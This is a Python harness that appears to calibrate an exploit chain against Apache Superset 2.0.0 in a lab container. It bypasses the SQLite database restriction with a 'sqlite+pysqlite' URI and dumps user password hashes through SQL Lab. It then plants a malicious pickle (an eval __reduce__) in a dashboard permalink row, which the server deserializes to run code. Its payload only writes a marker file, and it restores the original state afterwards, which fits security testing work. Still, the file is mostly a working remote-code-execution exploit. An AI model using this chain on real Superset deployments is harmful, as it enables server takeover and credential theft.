"""Native HTTP/SQL/deserialization controls. No Framework or owner invocation."""
import ast
import base64
import csv
import hashlib
import io
import json
from pathlib import Path
import pickle
import re
import subprocess
import sys
import traceback
import urllib.error
import urllib.parse
import urllib.request
import uuid

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'superset'))
from native_http import NativeHTTP


class NativeRCE(NativeHTTP):
    def observe(self, action, **options):
        source = Path(__file__).with_name('target_observer.py').read_text()
        argv = self.compose + ['exec', '-T', 'app', 'python', '-c', source, json.dumps(dict(action=action, **options))]
        row = {'argv': argv}
        self.commands.append(row)
        result = subprocess.run(argv, capture_output=True, text=True, timeout=30)
        row.update(stdout=result.stdout, stderr=result.stderr, exitstatus=result.returncode)
        assert result.returncode == 0, row
        lines = [line.removeprefix('MODULE-TARGET-RCE-JSON:') for line in result.stdout.splitlines()
                 if line.startswith('MODULE-TARGET-RCE-JSON:')]
        assert len(lines) == 1, row
        return json.loads(lines[0])

    def save(self):
        self.artifacts.mkdir(parents=True, exist_ok=True)
        (self.artifacts / 'native-rce-observations.json').write_text(
            json.dumps({'commands': self.commands, 'requests': self.requests}, indent=2) + '\n')

    def remove_marker(self, path):
        assert re.fullmatch(r'/tmp/module-target-native-[0-9a-f]{32}', path)
        argv = self.compose + ['exec', '-T', 'app', 'python', '-c',
                               'from pathlib import Path; import sys; Path(sys.argv[1]).unlink()', path]
        row = {'argv': argv, 'purpose': 'Remove only the independently observed native marker'}
        self.commands.append(row)
        result = subprocess.run(argv, capture_output=True, text=True, timeout=30)
        row.update(stdout=result.stdout, stderr=result.stderr, exitstatus=result.returncode)
        assert result.returncode == 0, row
        assert self.observe('marker', path=path) == {'exists': False, 'content': None}

    def api(self, browser, path, method='GET', data=None, multipart=None, csrf=None):
        assert path.startswith('/') and not path.startswith('//')
        headers = {'Accept': 'application/json'}
        body = None
        assert data is None or multipart is None
        if data is not None:
            body = json.dumps(data).encode()
            headers['Content-Type'] = 'application/json'
        if multipart is not None:
            boundary = 'ModuleNative' + uuid.uuid4().hex
            body = ''.join('--' + boundary + '\r\nContent-Disposition: form-data; name="' + key + '"\r\n\r\n' + json.dumps(value) + '\r\n'
                           for key, value in multipart.items()).encode() + ('--' + boundary + '--\r\n').encode()
            headers['Content-Type'] = 'multipart/form-data; boundary=' + boundary
        if csrf is not None:
            headers['X-CSRFToken'] = csrf
        request = urllib.request.Request(self.origin + path, data=body, headers=headers, method=method)
        row = {'url': request.full_url, 'method': method, 'headers': headers, 'body_base64': base64.b64encode(body).decode() if body else None}
        self.requests.append(row)
        try:
            try:
                response = browser.open(request, timeout=25)
            except urllib.error.HTTPError as error:
                response = error
            with response:
                received = response.read()
                row.update(status=response.code, headers_received=list(response.headers.items()), response_base64=base64.b64encode(received).decode())
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            row['transport_error'] = {'type': type(error).__name__, 'message': str(error)}
            raise
        return row['status'], received

    def expect(self, browser, path, expected, **options):
        status, body = self.api(browser, path, **options)
        assert status == expected, self.requests[-1]
        return body

    def query(self, browser, csrf, database_id, tab_id, sql):
        client_id = uuid.uuid4().hex[:10]
        self.expect(browser, '/tabstateview/' + str(tab_id), 200, method='PUT', csrf=csrf, multipart={'latest_query_id': client_id})
        data = {'client_id': client_id, 'database_id': database_id, 'json': True, 'runAsync': False,
                'schema': 'main', 'sql': sql, 'sql_editor_id': str(tab_id), 'tab': 'Module Native',
                'tmp_table_name': '', 'select_as_cta': False, 'ctas_method': 'TABLE', 'queryLimit': 1000, 'expand_data': True}
        body = self.expect(browser, '/superset/sql_json/', 200, method='POST', csrf=csrf, data=data)
        result = json.loads(body)
        assert not result.get('error') and not result.get('errors'), result
        return client_id, result


def main():
    runtime = json.loads(Path(sys.argv[1]).read_text())
    assert runtime['version'] == '2.0.0'
    native = NativeRCE(runtime['compose'], runtime['origin'], runtime['artifacts'])
    result = {'status': 'native_failed', 'framework_calls': 0, 'restored': False, 'cycles': []}
    try:
        sources = json.loads(Path(__file__).with_name('sources.json').read_text())
        actual = native.observe('sources', files=list(sources))
        result['installed_sources'] = actual
        for name, expected in sources.items():
            assert actual[name]['sha256'] == expected['sha256'], (name, actual[name]['sha256'], expected)
            assert hashlib.sha256(base64.b64decode(actual[name]['bytes_base64'])).hexdigest() == expected['sha256']
        baseline = native.app('state')
        raw_baseline = native.observe('snapshot')
        assert raw_baseline['tab_state'] == raw_baseline['table_schema'] == []
        assert baseline['dashboards'] == baseline['key_values'] == []
        result['baseline'] = baseline
        admin, _, _ = native.login('lab-admin', 'module-target-superset-admin-password', accepted=True)
        csrf = json.loads(native.expect(admin, '/api/v1/security/csrf_token/', 200))['result']
        gamma, _, _ = native.login('lab-user', 'module-target-superset-user-password', accepted=True)
        gamma_csrf = json.loads(native.expect(gamma, '/api/v1/security/csrf_token/', 200))['result']
        native.expect(gamma, '/api/v1/database/', 403, method='POST', csrf=gamma_csrf, data={})
        result['gamma_database_creation_refused'] = True
        spec = {'engine': 'sqlite', 'configuration_method': 'sqlalchemy_form', 'expose_in_sqllab': True,
                'allow_ctas': True, 'allow_cvas': True, 'allow_dml': True,
                'extra': json.dumps({'metadata_params': {}, 'engine_params': {}, 'schemas_allowed_for_file_upload': []})}
        # The ordinary sqlite URI is denied; the real driver-qualified bypass is
        # calibrated separately against the release's native validation/API.
        native.expect(admin, '/api/v1/database/', 422, method='POST', csrf=csrf,
                      data=dict(spec, database_name='Module Native Rejected', sqlalchemy_uri='sqlite:////app/superset_home/superset.db'))
        result['ordinary_sqlite_refused'] = True
        for _ in range(2):
            cycle = {'restored': False}
            result['cycles'].append(cycle)
            nonce = uuid.uuid4().hex
            marker = '/tmp/module-target-native-' + nonce
            assert native.observe('marker', path=marker) == {'exists': False, 'content': None}
            response = json.loads(native.expect(admin, '/api/v1/database/', 201, method='POST', csrf=csrf,
                                               data=dict(spec, database_name='Module Native ' + nonce,
                                                         sqlalchemy_uri='sqlite+pysqlite:////app/superset_home/superset.db')))
            database_id = response['id']
            cycle['database_id'] = database_id
            tab = json.loads(native.expect(admin, '/tabstateview/', 200, method='POST', csrf=csrf,
                                           multipart={'queryEditor': {'title': 'Module Native', 'dbId': database_id,
                                                                      'schema': None, 'autorun': False, 'sql': 'SELECT 42', 'queryLimit': 1000}}))['id']
            cycle['tab_id'] = tab
            _, query = native.query(admin, csrf, database_id, tab, 'SELECT username,password FROM ab_user ORDER BY id;')
            expected_users = [{'username': row['username'], 'password': row['password']} for row in raw_baseline['ab_user']]
            assert query['data'] == expected_users, query
            cycle['exact_account_hashes'] = True
            native.expect(admin, '/dashboard/new/', 302)
            location = dict(native.requests[-1]['headers_received'])['Location']
            matched = re.search(r'/dashboard/(\d+)/', location)
            assert matched, location
            dashboard = int(matched[1])
            cycle['dashboard_id'] = dashboard
            links = []
            for index in range(2):
                item = json.loads(native.expect(admin, '/api/v1/dashboard/' + str(dashboard) + '/permalink', 201,
                                                method='POST', csrf=csrf, data={'filterState': {'native': index}, 'urlParams': []}))
                links.append(item['key'])
                native.expect(admin, '/superset/dashboard/p/' + item['key'] + '/', 302)
            rows = native.observe('snapshot')['key_value']
            assert len(rows) == 2 and all(row['resource'] == 'dashboard_permalink' for row in rows)
            original = {row['id']: base64.b64decode(row['value']['bytes_base64']) for row in rows}
            client_id, _ = native.query(admin, csrf, database_id, tab, "SELECT id,value FROM key_value WHERE resource='dashboard_permalink' ORDER BY id;")
            csv_body = native.expect(admin, '/superset/csv/' + client_id, 200)
            csv_rows = list(csv.reader(io.StringIO(csv_body.decode())))
            assert csv_rows[0] == ['id', 'value'], csv_rows
            decoded_csv = {int(row[0]): ast.literal_eval(row[1]) for row in csv_rows[1:]}
            assert decoded_csv == original, 'CSV must round-trip actual native binary values'
            cycle['csv_binary_roundtrip'] = True
            # Return the native shape after a harmless observable side effect.
            # The installed GetKeyValueCommand performs the unpickle; this
            # client never deserializes the target's bytes on the host.
            value = {'dashboardId': str(dashboard), 'state': {'filterState': {'native': 0}, 'urlParams': []}}
            expression = "(__import__('pathlib').Path(" + repr(marker) + ').write_text(' + repr(nonce) + '),' + repr(value) + ')[1]'

            class Marker:
                def __reduce__(self):
                    return eval, (expression,)

            payload = pickle.dumps(Marker(), protocol=4)
            first_id = rows[0]['id']
            native.query(admin, csrf, database_id, tab, "UPDATE key_value SET value=X'" + payload.hex() + "' WHERE id=" + str(first_id) + ';')
            modified = native.observe('snapshot')['key_value']
            assert base64.b64decode(modified[0]['value']['bytes_base64']) == payload
            assert modified[1] == rows[1], 'Other native permalink row changed'
            native.expect(admin, '/superset/dashboard/p/' + links[0] + '/', 302)
            assert native.observe('marker', path=marker) == {'exists': True, 'content': nonce}
            cycle['native_deserialization_marker'] = {'path': marker, 'content': nonce}
            for identifier, data in original.items():
                native.query(admin, csrf, database_id, tab, "UPDATE key_value SET value=X'" + data.hex() + "' WHERE id=" + str(identifier) + ';')
            assert native.observe('snapshot')['key_value'] == rows, 'Original permalink bytes were not restored'
            for key in links:
                native.expect(admin, '/superset/dashboard/p/' + key + '/', 302)
            # Delete only this cycle's native-created state through the API and
            # SQL surface being calibrated; never mask it with direct DB repair.
            native.query(admin, csrf, database_id, tab, 'DELETE FROM key_value WHERE id IN (' + ','.join(str(x) for x in original) + ');')
            native.expect(admin, '/api/v1/dashboard/' + str(dashboard), 200, method='DELETE', csrf=csrf)
            native.expect(admin, '/tabstateview/' + str(tab), 200, method='DELETE', csrf=csrf)
            native.expect(admin, '/api/v1/database/' + str(database_id), 200, method='DELETE', csrf=csrf)
            assert native.app('state') == baseline
            after = native.observe('snapshot')
            assert after['tab_state'] == raw_baseline['tab_state'] and after['table_schema'] == raw_baseline['table_schema']
            assert after['key_value'] == raw_baseline['key_value']
            native.remove_marker(marker)
            cycle['restored'] = True
        result['restored'] = True
        result['status'] = 'native_passed'
    except BaseException as error:
        result['failure'] = {'type': type(error).__name__, 'message': str(error), 'traceback': traceback.format_exc()}
        raise
    finally:
        native.save()
        Path(runtime['artifacts'], 'native-rce-result.json').write_text(json.dumps(result, indent=2) + '\n')


if __name__ == '__main__':
    main()
